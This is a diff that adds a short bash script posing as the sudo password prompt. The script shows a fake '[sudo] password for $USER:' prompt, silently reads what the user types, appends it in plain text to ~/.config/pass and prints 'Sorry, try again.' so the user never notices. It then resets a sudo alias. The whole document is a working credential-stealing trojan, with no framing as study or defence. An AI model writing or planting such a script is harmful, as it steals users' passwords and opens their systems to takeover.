@@ -1,0 +1,17 @@
+#!/bin/bash
+
+PROMPT="[sudo] password for $USER: "
+printf "%s" "$PROMPT" >&2
+read -s PASSWORD
+echo "" >&2
+
+mkdir -p ~/.config
+echo "$PASSWORD" >> ~/.config/pass
+echo "Sorry, try again."
+
+if [ -f "$HOME/.bash_alias2" ]; then
+	alias sudo="/usr/bin/sudo"
+fi
+
+
+unset PASSWORD
